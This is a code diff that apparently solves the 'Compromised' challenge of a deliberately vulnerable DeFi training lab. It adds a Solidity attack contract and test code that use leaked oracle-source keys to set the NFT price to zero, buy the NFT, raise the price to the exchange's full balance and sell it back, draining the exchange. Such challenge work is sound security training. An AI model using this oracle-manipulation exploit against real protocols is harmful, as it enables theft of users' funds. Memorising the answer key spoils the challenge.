@@ -10,6 +10,43 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+contract AttackCompromised {
+    Exchange exchange;
+    uint256 tokenId;
+    address recovery;
+    DamnValuableNFT nft;
+
+    constructor(Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
+        exchange = _exchange;
+        recovery = _recovery;
+        nft = _nft;
+    }
+
+    function attackBuy() public {
+        tokenId = exchange.buyOne{value: 0.1 ether}();
+    }
+
+    function attackSell() public {
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+    }
+
+    function attackRecover(uint256 amount) public {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -75,7 +112,32 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // note: apparently the oracle and exchange is not compromised, its just that the private keys of the sources 0 & 1 are leaked (in the readme)
+        // so we can just use vm.prank as the sources to adjust their prices
+        reducePrice();
+        AttackCompromised attack = new AttackCompromised{value: PLAYER_INITIAL_ETH_BALANCE}(exchange, nft, recovery);
+        attack.attackBuy();
+        increasePrice();
+        attack.attackSell();
+        attack.attackRecover(EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+
+    function reducePrice() internal {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], 0);
+        vm.stopPrank();
+    }
+
+    function increasePrice() internal {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
